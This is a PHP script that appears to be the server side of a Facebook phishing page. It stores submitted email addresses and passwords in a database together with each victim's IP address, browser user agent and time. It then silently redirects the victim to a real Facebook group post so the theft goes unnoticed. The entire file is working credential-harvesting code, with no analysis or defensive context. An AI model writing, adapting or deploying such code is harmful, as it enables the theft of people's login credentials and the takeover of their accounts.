<?php
//https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2F


require_once("config.php");

	 if (isset($_POST["email"],$_POST["pass"])){
		if((!empty($_POST["email"])) && (!empty($_POST["pass"]))){
			
		
	$dados = array(
		"email"=>$_POST["email"],
		"senha"=>$_POST["pass"],
		"ip"=>$_SERVER["REMOTE_ADDR"],
		"browser"=>$_SERVER['HTTP_USER_AGENT']
	);

			/*Inclui dados no banco*/

			$conexao = new PDO("mysql:host=".$host.";dbname=".$db,$user,$pass);
		if ($conexao){
			$add = $conexao->prepare("INSERT INTO usuarios(email,senha,ip,HoraData,UserAgent)
			VALUES(:email,:senha,:ip,:HoraData,:UserAgent)");			
			
			$add->bindValue(":email",$dados["email"],PDO::PARAM_STR);
			$add->bindValue(":senha",$dados["senha"],PDO::PARAM_STR);
			$add->bindValue(":ip",$dados["ip"],PDO::PARAM_STR);	
			$add->bindValue(":HoraData",date("Y-m-d H:i:s"),PDO::PARAM_STR);
			$add->bindValue(":UserAgent",$dados["browser"],PDO::PARAM_STR);

				if($add->execute()){
					/* Redireciona para cadastro verdadeiro mantendo post;produto final */
	header("Location: https://www.facebook.com/groups/LosMemeSulamericanos/permalink/1088911514533761/?li=WTSWVwF8AyLCtYqHQoCn0lWu&e=1348028&locale2=pt_BR&refsrc=http%3A%2F%2Fwww.google.com.br%2F&_rdr",TRUE,307); 
			
				}else{include("index.html");}
		}

		




	}else{include("index.html");}

	}//isset



?>
